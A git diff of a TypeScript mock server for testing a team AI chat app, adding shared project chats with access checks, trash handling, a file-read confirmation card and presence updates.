@@ -3010,12 +4028,488 @@ export class MockServer {
         this.putFile(f.path, `---\nname: ${f.name}\ndescription: ${f.description ?? ''}\n${f.title ? `metadata:\n  title: ${f.title}\n` : ''}---\n${f.name} steps\n`)
       }
     }
+    else if (p === '/__test/rooms') {
+      // session markers (docs/DECISIONS.md): rooms as GET /api/rooms lists them (unread counts, "@", the AI waiting on
+      // me); each one is sent like the server's room.updated
+      this.rooms = (body.rooms as unknown[]).map((r) => Room.parse(r))
+      for (const r of this.rooms) this.publish({ type: 'room.updated', data: { roomId: r.id, change: 'updated', room: r } })
+    }
+    else if (p === '/__test/share-changed') {
+      // something changed since the last "confirm" (someone joined, lost access): its key is stale
+      this.shareEpoch++
+    }
     else if (p === '/__test/revoke') {
       // like the server after a folder-rule change: the folder is gone for everyone, who get an access_changed notice
       this.revoked.add(String(body.path))
       this.publish({ type: 'notice', data: { level: 'info', code: 'access_changed', message: String(body.path) } })
     }
     return Response.json({ ok: true })
+  }
+
+  // ---------------- shared project chats (docs/DECISIONS.md "Shared project chats") ----------------
+  // Like server/src/chat/shared.ts, short, as one layer over the handlers above (installSharedChats, run once when the
+  // mock is made). A project's setting (PATCH /api/projects/:id {shareChats}; 409 project_personal / safe_ops /
+  // project_in_trash), its audience (the active people who can read its folder) and its shared chats (not in the trash);
+  // a chat made in a project whose setting is on is a shared chat. Each viewer gets their own Chat.shared (who made it,
+  // the audience, `answering`: someone else's turn, `waiting` while its read card is open; `mine`: made it or wrote in it;
+  // `canDelete`: its creator or a project editor). GET /api/chats has the shared chats I wrote in; ?projectId= every shared
+  // chat of the project I can see. A turn there is a short scripted one of its sender: its deltas, steps, cards and end go
+  // to that person's windows only, chat.updated to everyone who sees the chat (each their own view). "readcard" in the
+  // message: the read card (읽고 공유하기 / 읽지 않기) for finance/2026/q3.csv before the answer; "hold": the answer waits
+  // until POST /__test/shared-release {chatId?}. The refusals: 409 shared_chat_busy / safe_ops / shared_chat_upload /
+  // shared_chat_move, 403 shared_chat_creator / shared_chat_runner / shared_chat_own_messages / shared_chat_manage.
+  // The trash ("Shared project chats: the trash and live lists"): a shared chat is in its creator's and in the deleter's,
+  // while they may restore it; deleting the project moves its shared chats to their creators' trash as chats of theirs
+  // (unshared, without project; one whose creator cannot see the project goes for good), and the others hear they are
+  // gone. POST /__test/revoke tells whoever stops seeing a shared chat (chat.updated 'deleted' with no chat).
+  sharedProjects = new Set<string>()
+  sharedChats = new Map<string, { by: { id: string; name: string }; projectId: string; runner: string | null; waiting: boolean }>()
+  /** who made each chat made here: a chat of one person is theirs alone, like chatFor (the handlers above have no owners) */
+  chatOwners = new Map<string, string>()
+  /** who put each shared chat in the trash (chats.deleted_by) */
+  sharedDeletedBy = new Map<string, string>()
+  sharedHolds = new Map<string, () => void>()
+  /** (the layer is in place; set while the mock is made, after the handlers above) */
+  readonly sharedInstalled = this.installSharedChats()
+
+  sharedAudience(p: Project): User[] {
+    return this.users.filter((u) => u.status === 'active' && this.access(p.folderPath, u) !== 'none')
+  }
+  /** like server/src/chat/projects.ts mayEditProject: its creator, or an admin who can write its folder */
+  sharedMayEdit(p: Project, u: User): boolean {
+    return p.createdBy?.id === u.id || (u.role !== 'member' && this.access(p.folderPath, u) === 'write')
+  }
+  sharedProjectOut(p: Project): Project {
+    const personal = p.folderPath.startsWith('users/')
+    return { ...p, shareChats: !personal && this.sharedProjects.has(p.id), audience: this.sharedAudience(p).length,
+      sharedChats: this.chats.filter((c) => c.projectId === p.id && !c.deletedAt && this.sharedChats.has(c.id)).length }
+  }
+  /** The chat as `viewer` sees it (null: they cannot see its project); a chat of one person as it is. */
+  sharedView(chat: Chat, viewer: User): Chat | null {
+    const s = this.sharedChats.get(chat.id)
+    if (!s) return chat
+    const p = this.projects.find((x) => x.id === s.projectId)
+    if (!p || this.access(p.folderPath, viewer) === 'none') return null
+    const { waiting: _w, unseen: _u, shared: _s, ...rest } = chat
+    const runner = s.runner && s.runner !== viewer.id ? this.users.find((u) => u.id === s.runner) : undefined
+    return {
+      ...rest,
+      ...(s.runner === viewer.id && s.waiting ? { waiting: true as const } : {}),
+      ...(chat.unseen && s.by.id === viewer.id ? { unseen: true as const } : {}),
+      shared: {
+        by: s.by,
+        audience: this.sharedAudience(p).length,
+        answering: runner ? { name: runner.name, ...(s.waiting ? { waiting: true as const } : {}) } : null,
+        mine: s.by.id === viewer.id || this.messages.some((m) => m.chatId === chat.id && m.role === 'user' && m.author?.id === viewer.id),
+        canDelete: s.by.id === viewer.id || this.sharedMayEdit(p, viewer),
+      },
+    }
+  }
+  /** Who wrote in a shared chat, for its project's page (chat/shared.ts chatPeople): the most recent writer first, at
+   * most 3, and how many */
+  sharedPeople(chatId: string): { people: { id: string; name: string }[]; peopleCount: number } {
+    const last = new Map<string, number>()
+    this.messages.forEach((m, i) => { if (m.chatId === chatId && m.role === 'user' && m.author) last.set(m.author.id, i) })
+    const ids = [...last].sort((a, b) => b[1] - a[1]).map(([id]) => id)
+    return { people: ids.slice(0, 3).map((id) => ({ id, name: this.users.find((u) => u.id === id)?.name ?? id })), peopleCount: ids.length }
+  }
+  /** One event per window, each made for that window's person (null: none for them); seq goes on as for any event. */
+  sharedSend(make: (userId: string) => ServerEventInput | null) {
+    for (const ws of this.sockets) {
+      const ev = make(ws.data.user)
+      if (!ev) continue
+      const full = { ...ev, seq: ++this.seq, at: Date.now() }
+      ServerEvent.parse(full)
+      ws.send(JSON.stringify(full))
+    }
+  }
+
+  private installSharedChats() {
+    const h = this.handlers
+    const over = (name: ApiName, fn: (c: Ctx, base: Handler) => unknown) => {
+      const base = h[name]!
+      h[name] = (c) => fn(c, base)
+    }
+    const shared = (id: string | undefined) => (id ? this.sharedChats.get(id) : undefined)
+    const chatOf = (id: string) => this.chats.find((x) => x.id === id) ?? fail('not_found', 404)
+    const view = (chat: Chat, u: User) => this.sharedView(chat, u) ?? fail('not_found', 404)
+    const nameOf = (id: string) => this.users.find((u) => u.id === id)?.name ?? ''
+    const project = (s: { projectId: string }) => this.projects.find((p) => p.id === s.projectId)
+
+    const baseReset = this.reset.bind(this)
+    this.reset = (o) => {
+      for (const release of this.sharedHolds.values()) release()
+      this.sharedProjects = new Set()
+      this.sharedChats = new Map()
+      this.chatOwners = new Map()
+      this.sharedDeletedBy = new Map()
+      this.sharedHolds = new Map()
+      baseReset(o)
+    }
+    // the events of a shared chat: chat.updated to everyone who sees it (their own view), the rest to the runner
+    const basePublish = this.publish.bind(this)
+    this.publish = (ev) => {
+      const chatId = (ev.data as { chatId?: unknown }).chatId
+      const s = typeof chatId === 'string' ? this.sharedChats.get(chatId) : undefined
+      if (!s) return basePublish(ev)
+      if (ev.type === 'chat.updated') {
+        const d = ev.data
+        const p = project(s)
+        return this.sharedSend((uid) => {
+          const u = this.users.find((x) => x.id === uid)
+          if (!u) return null
+          if (!d.chat) return p && this.access(p.folderPath, u) !== 'none' ? ev : null
+          const v = this.sharedView(d.chat, u)
+          return v ? ({ ...ev, data: { ...d, chat: v } } as ServerEventInput) : null
+        })
+      }
+      const to = s.runner ?? s.by.id
+      return this.sharedSend((uid) => (uid === to ? ev : null))
+    }
+    const baseControl = this.testControl.bind(this)
+    this.testControl = async (p, req) => {
+      // a folder taken away: whoever saw a shared chat of a project there hears it is gone, by its id alone (like
+      // admin/folders.ts afterAccessChange)
+      if (p === '/__test/revoke') {
+        const saw = [...this.sharedChats].flatMap(([id, x]) => { const pj = project(x); return pj && !this.chats.find((c) => c.id === id)?.deletedAt ? [{ id, pj, people: this.sharedAudience(pj).map((u) => u.id) }] : [] })
+        const out = await baseControl(p, req)
+        for (const x of saw) {
+          const now = new Set(this.sharedAudience(x.pj).map((u) => u.id))
+          this.sharedSend((uid) => (x.people.includes(uid) && !now.has(uid) ? { type: 'chat.updated', data: { chatId: x.id, change: 'deleted', chat: null } } : null))
+        }
+        return out
+      }
+      if (p !== '/__test/shared-release') return baseControl(p, req)
+      const body = (await req.json().catch(() => ({}))) as { chatId?: string }
+      for (const [id, release] of [...this.sharedHolds]) if (!body.chatId || body.chatId === id) { this.sharedHolds.delete(id); release() }
+      return Response.json({ ok: true })
+    }
+
+    over('listProjects', (c, base) => ({ items: (base(c) as { items: Project[] }).items.map((p) => this.sharedProjectOut(p)) }))
+    over('getProject', (c, base) => this.sharedProjectOut(base(c) as Project))
+    over('updateProject', (c, base) => {
+      const p = this.projects.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
+      const { shareChats, ...rest } = c.body as { shareChats?: boolean }
+      if (shareChats !== undefined) {
+        if (p.folderPath.startsWith('users/')) fail('conflict', 409, '개인 프로젝트의 채팅은 공유할 수 없어요.', { 'body.shareChats': 'project_personal' }, { reason: 'project_personal' })
+        if (shareChats && this.allConfidential) fail('conflict', 409, '안전 작업 모드에서는 채팅을 공유할 수 없어요.', { 'body.shareChats': 'safe_ops' }, { reason: 'safe_ops' })
+        if (p.inTrash) fail('conflict', 409, '폴더가 휴지통에 있는 프로젝트예요.', { 'body.shareChats': 'project_in_trash' }, { reason: 'project_in_trash' })
+        if (shareChats) this.sharedProjects.add(p.id)
+        else this.sharedProjects.delete(p.id)
+      }
+      return this.sharedProjectOut(base({ ...c, body: rest }) as Project)
+    })
+    // its shared chats go to their creators' trash, as chats of theirs without project (one whose creator cannot see
+    // the project goes for good); everyone else who saw one hears it is gone
+    over('deleteProject', (c, base) => {
+      const pj = this.projects.find((x) => x.id === c.params.id)
+      const audience = pj ? this.sharedAudience(pj).map((u) => u.id) : []
+      const shared = this.chats.filter((x) => x.projectId === c.params.id && this.sharedChats.has(x.id))
+      const by = (x: Chat) => this.sharedChats.get(x.id)!.by.id
+      const keeps = (x: Chat) => { const u = this.users.find((y) => y.id === by(x)); return !!pj && !!u && this.access(pj.folderPath, u) !== 'none' }
+      const kept = shared.filter(keeps)
+      for (const x of shared) this.sharedSend((uid) => (audience.includes(uid) && !(kept.includes(x) && uid === by(x)) ? { type: 'chat.updated', data: { chatId: x.id, change: 'purged', chat: null } } : null))
+      for (const x of kept) {
+        const creator = by(x)
+        this.sharedChats.delete(x.id)
+        x.projectId = null
+        if (x.deletedAt) continue
+        x.deletedAt = now()
+        this.sharedDeletedBy.set(x.id, c.user.id)
+        this.sharedSend((uid) => (uid === creator ? { type: 'chat.updated', data: { chatId: x.id, change: 'deleted', chat: x } } : null))
+      }
+      for (const x of shared) if (!kept.includes(x)) this.sharedChats.delete(x.id)
+      this.chats = this.chats.filter((x) => !shared.includes(x) || kept.includes(x))
+      return base(c)
+    })
+
+    /** a chat of one person made here by someone else: not this viewer's to see */
+    const othersPrivate = (id: string, u: User) => !this.sharedChats.has(id) && (this.chatOwners.get(id) ?? u.id) !== u.id
+    over('listChats', (c, base) => {
+      const out = base(c) as { items: Chat[]; nextCursor: string | null }
+      const items = out.items.flatMap((x) => {
+        if (othersPrivate(x.id, c.user)) return []
+        if (!this.sharedChats.has(x.id)) return [x]
+        const v = this.sharedView(x, c.user)
+        if (!v) return []
+        // the trash: its creator's, and the deleter's while they may restore it
+        if (x.deletedAt) return v.shared!.by.id === c.user.id || (this.sharedDeletedBy.get(x.id) === c.user.id && v.shared!.canDelete) ? [v] : []
+        if (!c.query.projectId) return v.shared!.mine ? [v] : []
+        return [{ ...v, shared: { ...v.shared!, ...this.sharedPeople(x.id) } }]
+      })
+      return { ...out, items }
+    })
+    over('createChat', (c, base) => {
+      const out = base(c) as { status: number; body: Chat }
+      this.chatOwners.set(out.body.id, c.user.id)
+      const p = c.body.projectId ? this.projects.find((x) => x.id === c.body.projectId) : undefined
+      if (!p || !this.sharedProjects.has(p.id) || p.folderPath.startsWith('users/') || p.inTrash || this.allConfidential) return out
+      this.sharedChats.set(out.body.id, { by: { id: c.user.id, name: c.user.name }, projectId: p.id, runner: null, waiting: false })
+      this.publish({ type: 'chat.updated', data: { chatId: out.body.id, change: 'created', chat: out.body } })
+      return { ...out, body: view(out.body, c.user) }
+    })
+    over('getChat', (c, base) => {
+      const x = base(c) as Chat
+      if (othersPrivate(x.id, c.user)) fail('not_found', 404)
+      return this.sharedChats.has(x.id) ? view(x, c.user) : x
+    })
+    over('listMessages', (c, base) => {
+      if (shared(c.params.id)) view(chatOf(c.params.id!), c.user)
+      else if (othersPrivate(c.params.id!, c.user)) fail('not_found', 404)
+      return base(c)
+    })
+    over('markChatSeen', (c, base) => {
+      const s = shared(c.params.id)
+      if (!s) return base(c)
+      const x = view(chatOf(c.params.id!), c.user)
+      return s.by.id === c.user.id ? view(base(c) as Chat, c.user) : x
+    })
+    over('updateChat', (c, base) => {
+      const s = shared(c.params.id)
+      if (!s) return base(c)
+      const chat = view(chatOf(c.params.id!), c.user)
+      if (s.by.id !== c.user.id) fail('forbidden', 403, '공유 채팅의 이름과 엔진은 만든 사람만 바꿀 수 있어요.', undefined, { reason: 'shared_chat_creator' })
+      if (c.body.projectId !== undefined && c.body.projectId !== chat.projectId) fail('conflict', 409, '공유 채팅은 다른 프로젝트로 옮길 수 없어요.', { 'body.projectId': 'shared_chat_move' }, { reason: 'shared_chat_move' })
+      const out = base(c) as Chat
+      this.publish({ type: 'chat.updated', data: { chatId: out.id, change: 'updated', chat: out } })
+      return view(out, c.user)
+    })
+    over('deleteChat', (c, base) => {
+      const s = shared(c.params.id)
+      if (!s) return base(c)
+      if (!view(chatOf(c.params.id!), c.user).shared!.canDelete) fail('forbidden', 403, '공유 채팅은 만든 사람이나 프로젝트를 고칠 수 있는 사람만 지울 수 있어요.', undefined, { reason: 'shared_chat_manage' })
+      const out = base(c)
+      this.sharedDeletedBy.set(c.params.id!, c.user.id)
+      this.publish({ type: 'chat.updated', data: { chatId: c.params.id!, change: 'deleted', chat: null } })
+      return out
+    })
+    over('restoreChat', (c, base) => {
+      const s = shared(c.params.id)
+      if (!s) return base(c)
+      if (!view(chatOf(c.params.id!), c.user).shared!.canDelete) fail('forbidden', 403, '공유 채팅은 만든 사람이나 프로젝트를 고칠 수 있는 사람만 지울 수 있어요.', undefined, { reason: 'shared_chat_manage' })
+      const out = base(c) as Chat
+      this.sharedDeletedBy.delete(out.id)
+      this.publish({ type: 'chat.updated', data: { chatId: out.id, change: 'restored', chat: out } })
+      return view(out, c.user)
+    })
+    over('listTurnRequests', (c, base) => {
+      const s = shared(c.params.id)
+      return s && s.runner !== c.user.id ? { items: [] } : base(c)
+    })
+    over('answerTurn', (c, base) => {
+      const open = this.openAsks.get(c.params.id!)
+      const s = open ? shared(open.chatId) : undefined
+      if (s && s.runner !== c.user.id) fail('forbidden', 403, '질문한 사람만 이 카드에 답할 수 있어요.')
+      return base(c)
+    })
+    // a shared chat takes team files only
+    over('uploadAttachment', (c, base) => {
+      if (shared((c.body as { chatId?: string }).chatId)) fail('conflict', 409, '공유 채팅에는 팀 파일만 붙일 수 있어요. 컴퓨터의 파일은 프로젝트 폴더에 올린 뒤 붙여 주세요.', undefined, { reason: 'shared_chat_upload' })
+      return base(c)
+    })
+    over('createUploadSession', (c, base) => {
+      const target = c.body.target as { kind: string; chatId?: string }
+      if (target.kind === 'attachment' && shared(target.chatId)) fail('conflict', 409, '공유 채팅에는 팀 파일만 붙일 수 있어요. 컴퓨터의 파일은 프로젝트 폴더에 올린 뒤 붙여 주세요.', undefined, { reason: 'shared_chat_upload' })
+      return base(c)
+    })
+
+    /** one turn at a time: someone else's (409 shared_chat_busy, naming them) or my own */
+    const notBusy = (s: { runner: string | null }, u: User) => {
+      if (s.runner && s.runner !== u.id) fail('conflict', 409, `${nameOf(s.runner)}님의 질문에 답하는 중이에요. 끝나면 보낼 수 있어요.`, undefined, { reason: 'shared_chat_busy' })
+      if (s.runner) fail('conflict', 409, '이 채팅은 아직 답하는 중이에요.')
+    }
+    const mayContinue = (u: User, chatId: string) => {
+      view(chatOf(chatId), u)
+      if (this.allConfidential) fail('conflict', 409, '안전 작업 모드라서 공유 채팅을 이어갈 수 없어요. 내 채팅에서 물어봐 주세요.', undefined, { reason: 'safe_ops' })
+    }
+    const teamOnly = (ids: string[]) => {
+      const atts = ids.map((id) => this.attachments.get(id)).filter((a): a is NonNullable<typeof a> => !!a)
+      if (atts.some((a) => a.source !== 'team')) fail('conflict', 409, '공유 채팅에는 팀 파일만 붙일 수 있어요. 컴퓨터의 파일은 프로젝트 폴더에 올린 뒤 붙여 주세요.', undefined, { reason: 'shared_chat_upload' })
+      return atts.map(({ data: _d, ...rest }) => rest)
+    }
+    const ownOnly = (m: Message | undefined, u: User) => {
+      if (m?.author?.id !== u.id) fail('forbidden', 403, '공유 채팅에서는 내 메시지만 고치거나 다시 답하게 할 수 있어요.', undefined, { reason: 'shared_chat_own_messages' })
+    }
+    const started = (user: Message | null, assistant: Message) => ({ status: 202, body: { userMessage: user ? this.view(user) : null, assistantMessage: this.view(assistant), turnId: assistant.turnId, queuePosition: 0, queueEpoch: this.epoch, queueRevision: this.queueRevision } })
+
+    over('sendMessage', (c, base) => {
+      const s = shared(c.params.id)
+      if (!s) return base(c)
+      const again = this.messages.find((m) => (m as Message & { cmid?: string }).cmid === c.body.clientMessageId)
+      if (again) fail('conflict', 409)
+      mayContinue(c.user, c.params.id!)
+      notBusy(s, c.user)
+      const chat = chatOf(c.params.id!)
+      const attachments = teamOnly(c.body.attachmentIds as string[])
+      const parentId = c.body.parentId ?? this.activeLeaf.get(chat.id) ?? null
+      const user = this.message({ chatId: chat.id, role: 'user', parentId, content: c.body.content, attachments, author: { id: c.user.id, name: c.user.name } })
+      ;(user as Message & { cmid?: string }).cmid = c.body.clientMessageId
+      return started(user, this.sharedTurn(chat, c.user, c.body.content, user.id))
+    })
+    over('regenerate', (c, base) => {
+      const s = shared(c.params.id)
+      if (!s) return base(c)
+      mayContinue(c.user, c.params.id!)
+      const old = this.messages.find((m) => m.id === c.params.messageId) ?? fail('not_found', 404)
+      const question = this.messages.find((m) => m.id === old.parentId)
+      ownOnly(question, c.user)
+      notBusy(s, c.user)
+      return started(null, this.sharedTurn(chatOf(c.params.id!), c.user, question!.content, question!.id))
+    })
+    over('editMessage', (c, base) => {
+      const s = shared(c.params.id)
+      if (!s) return base(c)
+      mayContinue(c.user, c.params.id!)
+      const old = this.messages.find((m) => m.id === c.params.messageId) ?? fail('not_found', 404)
+      ownOnly(old, c.user)
+      notBusy(s, c.user)
+      const attachments = teamOnly(c.body.attachmentIds as string[])
+      const user = this.message({ chatId: old.chatId, role: 'user', parentId: old.parentId, content: c.body.content, attachments, author: { id: c.user.id, name: c.user.name } })
+      return started(user, this.sharedTurn(chatOf(c.params.id!), c.user, c.body.content, user.id))
+    })
+    over('selectBranch', (c, base) => {
+      if (shared(c.params.id)) mayContinue(c.user, c.params.id!)
+      return base(c)
+    })
+    over('stop', (c, base) => {
+      const s = shared(c.params.id)
+      if (!s) return base(c)
+      view(chatOf(c.params.id!), c.user)
+      if (s.runner && s.runner !== c.user.id) fail('forbidden', 403, '질문한 사람만 이 답변을 멈출 수 있어요.', undefined, { reason: 'shared_chat_runner' })
+      const out = base(c)
+      this.sharedHolds.get(c.params.id!)?.()
+      this.sharedHolds.delete(c.params.id!)
+      return out
+    })
+
+    // "프로젝트 사람들과 공유" (server/src/chat/share-chat.ts, short): a chat of mine in a team project that shares its
+    // chats. What its answers read (the recorded sources: "sources", "mine-source") that some of the project's other
+    // people cannot open makes it ask first (how many; the folders I may open, my own folder, more I cannot); a question
+    // with "memory" in it brings the memory note; `ask` asks first anyway. The key is stale after POST
+    // /__test/share-changed.
+    const no = (reason: string, message: string): never => fail('conflict', 409, message, undefined, { reason })
+    h.shareChat = (c) => {
+      const chat = chatOf(c.params.id!)
+      if (this.sharedChats.has(chat.id)) { view(chat, c.user); no('already_shared', '이미 프로젝트 사람들과 공유한 채팅이에요.') }
+      if (othersPrivate(chat.id, c.user) || chat.deletedAt) fail('not_found', 404)
+      if (this.allConfidential || chat.confidential) no('safe_ops', '안전 작업 모드이거나 기밀 대화라 공유할 수 없어요.')
+      const p = chat.projectId ? this.projects.find((x) => x.id === chat.projectId) : undefined
+      if (!p || this.access(p.folderPath, c.user) === 'none') return no('project_not_sharing', '이 채팅은 채팅을 공유하는 팀 프로젝트에 있지 않아요. 그런 프로젝트로 옮긴 뒤에 공유해 주세요.')
+      if (p.folderPath.startsWith('users/')) no('project_personal', '개인 프로젝트의 채팅은 공유할 수 없어요.')
+      if (p.inTrash) no('project_in_trash', '이 프로젝트의 폴더가 휴지통에 있어요.')
+      if (!this.sharedProjects.has(p.id)) no('project_not_sharing', '이 채팅은 채팅을 공유하는 팀 프로젝트에 있지 않아요. 그런 프로젝트로 옮긴 뒤에 공유해 주세요.')
+      if (chat.runState !== 'idle') no('chat_busy', '답변이 아직 진행 중이에요. 끝난 뒤에 공유해 주세요.')
+      const others = this.sharedAudience(p).filter((u) => u.id !== c.user.id)
+      const msgs = this.messages.filter((m) => m.chatId === chat.id)
+      const blind = new Set<string>()
+      const places = new Map<string, AnswerSharePlace>()
+      let otherPlaces = false
+      for (const f of msgs.filter((m) => m.role === 'assistant').flatMap((m) => this.sources.get(m.id) ?? [])) {
+        const miss = others.filter((u) => this.access(f.path, u) === 'none')
+        if (!miss.length) continue
+        for (const u of miss) blind.add(u.id)
+        const place: AnswerSharePlace | null = f.path.startsWith(`users/${c.user.id}/`) ? { kind: 'mine' } : this.access(f.path, c.user) !== 'none' ? { kind: 'folder', path: f.path.split('/').slice(0, -1).join('/') } : null
+        if (place) places.set(JSON.stringify(place), place)
+        else otherPlaces = true
+      }
+      const memories = msgs.some((m) => m.role === 'user' && /memory/i.test(m.content))
+      const confirmKey = `mock-share-${chat.id}-${this.shareEpoch}-${others.length}`
+      // `ask` (the title menu): the question first even when nothing applies
+      if ((blind.size || memories || c.body.ask || c.body.confirmKey !== undefined) && c.body.confirmKey !== confirmKey) {
+        return {
+          status: 'confirm', audience: others.length, memories, confirmKey,
+          provenance: blind.size ? { people: blind.size, places: [...places.values()], otherPlaces } : null,
+          ...(c.body.confirmKey !== undefined ? { reason: 'changed' as const } : {}),
+        }
+      }
+      this.sharedChats.set(chat.id, { by: { id: c.user.id, name: c.user.name }, projectId: p.id, runner: null, waiting: false })
+      chat.updatedAt = now()
+      this.publish({ type: 'chat.updated', data: { chatId: chat.id, change: 'updated', chat } })
+      return { status: 'shared', chat: view(chat, c.user) }
+    }
+    return true
+  }
+
+  /** A turn of `user` in a shared chat: the scripted answer (see above), its events to `user` only. */
+  sharedTurn(chat: Chat, user: User, prompt: string, parentId: string): Message {
+    const s = this.sharedChats.get(chat.id)!
+    const turnId = uuidv7()
+    const assistant = this.message({ chatId: chat.id, role: 'assistant', parentId, status: 'streaming', turnId, engine: chat.engine })
+    this.activeLeaf.set(chat.id, assistant.id)
+    s.runner = user.id
+    chat.runState = 'running'
+    chat.updatedAt = now()
+    if (!chat.title) chat.title = prompt.slice(0, 30)
+    this.queueRevision++
+    this.publish({ type: 'chat.updated', data: { chatId: chat.id, change: 'updated', chat } })
+    const gen = this.generation
+    this.runSharedTurn(chat, user, prompt, assistant).catch((e) => { if (gen === this.generation) console.error('mock shared turn failed', e) })
+    return assistant
+  }
+
+  async runSharedTurn(chat: Chat, user: User, prompt: string, assistant: Message) {
+    const s = this.sharedChats.get(chat.id)!
+    const chatId = chat.id
+    const turnId = assistant.turnId!
+    const gen = this.generation
+    const pub = (ev: ServerEventInput) => {
+      if (gen !== this.generation) throw new Error('mock was reset')
+      this.publish(ev)
+    }
+    const put = (st: Step) => {
+      assistant.steps = [...assistant.steps.filter((x) => x.id !== st.id), st]
+      pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: st } })
+    }
+    await sleep(60)
+    pub({ type: 'queue.position', data: { chatId, messageId: assistant.id, turnId, position: 0, epoch: this.epoch, revision: ++this.queueRevision } })
+    let text = '네, 정리했어요.\n\n- 출시는 다음 주 화요일이에요.\n- 안내 문구는 마케팅 폴더의 계획을 따라요.'
+    if (/readcard/i.test(prompt)) {
+      // like chat/turn.ts confirmSharedRead: a place some of the chat's people cannot read waits for the sender's yes
+      const read: Step = { id: 'r1', kind: 'tool', tool: 'read', label: '파일 읽기 · finance/2026/q3.csv', status: 'running', startedAt: now(), endedAt: null }
+      put(read)
+      const people = this.sharedAudience(this.projects.find((p) => p.id === s.projectId)!)
+      const blind = people.filter((u) => this.access('finance/2026/q3.csv', u) === 'none').length
+      const requestId = `shared-read-${turnId}`
+      const request: TurnRequest = {
+        kind: 'ask_user', origin: 'server', requestId, allowText: false, multiple: false,
+        question: `AI가 finance/2026/q3.csv을(를) 읽으려고 해요. 이 채팅을 보는 프로젝트 사람 ${people.length}명 중 ${blind}명은 이곳을 볼 수 없어요. 읽으면 모두가 이 채팅에서 내용을 보게 돼요.`,
+        options: [{ label: '읽고 공유하기', value: 'share' }, { label: '읽지 않기', value: 'skip' }],
+        expiresAt: new Date(Date.now() + 600_000).toISOString(),
+      }
+      this.openAsks.set(turnId, { turnId, chatId, messageId: assistant.id, request })
+      s.waiting = true
+      pub({ type: 'turn.request', data: { turnId, chatId, messageId: assistant.id, request } })
+      pub({ type: 'chat.updated', data: { chatId, change: 'updated', chat, notify: 'card' } })
+      const answer = await new Promise((r) => this.pendingAsk.set(turnId, r))
+      if (gen !== this.generation) return
+      this.openAsks.delete(turnId)
+      s.waiting = false
+      // (no chatId in it: to the runner here)
+      this.sharedSend((uid) => (uid === user.id ? { type: 'turn.request.closed', data: { turnId, requestId, reason: 'answered' } } : null))
+      pub({ type: 'chat.updated', data: { chatId, change: 'updated', chat } })
+      const yes = answer === 'share' || (Array.isArray(answer) && answer[0] === 'share')
+      put({ ...read, status: 'ok', endedAt: now(), ...(yes ? {} : { label: '프로젝트 사람 모두가 볼 수는 없는 곳이라 읽지 않았어요' }) })
+      text = yes ? '3분기 금액은 100이에요 (finance/2026/q3.csv).' : '그 파일은 읽지 않았어요. 프로젝트 사람 모두가 볼 수 있는 자료로만 답할게요.'
+    }
+    if (/hold/i.test(prompt) && !this.stopped.has(turnId)) await new Promise<void>((r) => this.sharedHolds.set(chatId, r))
+    if (gen !== this.generation) return
+    if (!this.stopped.has(turnId)) {
+      const half = Math.ceil(text.length / 2)
+      pub({ type: 'message.delta', data: { chatId, messageId: assistant.id, offset: 0, text: text.slice(0, half) } })
+      await sleep(30)
+      pub({ type: 'message.delta', data: { chatId, messageId: assistant.id, offset: half, text: text.slice(half) } })
+      assistant.content = text
+    }
+    assistant.status = this.stopped.has(turnId) ? 'stopped' : 'done'
+    assistant.usage = { inputTokens: 100, outputTokens: 50, costUsd: 0.001 }
+    assistant.model = 'claude-sonnet'
+    assistant.engine = 'claude-code'
+    pub({ type: 'message.done', data: { chatId, messageId: assistant.id, status: assistant.status, message: this.view(assistant) } })
+    s.runner = null
+    chat.runState = 'idle'
+    chat.updatedAt = now()
+    this.queueRevision++
+    pub({ type: 'chat.updated', data: { chatId, change: 'updated', chat } })
   }
 
   serve(port: number, dist: string) {
@@ -3053,10 +4547,13 @@ export class MockServer {
               for (const b of self.buffer) if (b.seq > after) ws.send(b.text)
             }
           } else ws.send(hello(false))
+          // who is online or away: the whole list after the hello and any replay (server/src/realtime/presence.ts)
+          ws.send(JSON.stringify(PresenceFrame.parse({ type: 'presence', full: true, people: [...self.presence].map(([id, state]) => ({ id, state })) })))
         },
         message(ws, msg) {
-          const f = JSON.parse(String(msg)) as { type: string; t?: number }
+          const f = JSON.parse(String(msg)) as { type: string; t?: number; state?: string }
           if (f.type === 'ping') ws.send(JSON.stringify({ type: 'pong', t: f.t ?? 0 }))
+          if (f.type === 'presence') self.presenceSent.push({ user: ws.data.user, windowId: ws.data.windowId, state: String(f.state) })
         },
         close(ws) {
           self.sockets.delete(ws)
@@ -3083,7 +4580,7 @@ const FAKE_MCP_TOOLS: IntegrationTool[] = [
 const privateHost = (h: string) => h === 'localhost' || h.endsWith('.localhost') || h.endsWith('.local') || h.endsWith('.internal') || /^(127|10)\./.test(h) || /^192\.168\./.test(h) || /^172\.(1[6-9]|2\d|3[01])\./.test(h) || h === '[::1]'
 
 function defaultSettings(): TeamSettings {
-  return { teamName: 'Acme', defaultLocale: 'ko', defaultEngine: 'claude-code', defaultModel: null, concurrency: 2, updateChannel: 'stable', updateWindow: null, auditRetentionDays: 365, fileHistoryRetentionDays: 90, trashRetentionDays: 30, chatTrashRetentionDays: 7, timeZone: 'Asia/Seoul', browserAllowAll: true, personalIntegrations: true, aiVision: true, aiSubagents: true, answerStepLimit: 150, speechProvider: 'local', speechModel: 'openai/whisper-large-v3-turbo', aiMediaTranscripts: null }
+  return { teamName: 'Acme', defaultLocale: 'ko', defaultEngine: 'claude-code', defaultModel: null, concurrency: 2, updateChannel: 'stable', updateWindow: null, auditRetentionDays: 365, fileHistoryRetentionDays: 90, trashRetentionDays: 30, chatTrashRetentionDays: 7, timeZone: 'Asia/Seoul', browserAllowAll: true, personalIntegrations: true, aiVision: true, aiSubagents: true, roomAlwaysAllow: true, answerStepLimit: 150, speechProvider: 'local', speechModel: 'openai/whisper-large-v3-turbo', aiMediaTranscripts: null, introDeckTier: 'standard' }
 }
 
 /** What the real server's securityHeaders() middleware adds to every non-/api response (server/src/http/middleware.ts). */
@@ -3094,6 +4591,17 @@ function pageHeaders(res: Response): Response {
   h.set('X-Frame-Options', 'DENY')
   h.set('Cross-Origin-Opener-Policy', 'same-origin')
   return new Response(res.body, { status: res.status, headers: h })
+}
+
+/** Playwright's Chromium (its headless shell) kills the page's renderer as soon as a service worker calls the Badging
+ * API; Chrome, full Chromium and Electron do not. web/pwa/sw.js clears the icon badge whenever the account changes
+ * (`push.invalidate`, sent at every sign-out), so the worker served here gets no-op setAppBadge / clearAppBadge in
+ * front of it and is otherwise the built file. Its badge logic is tested in test/unit/push-worker.test.ts. */
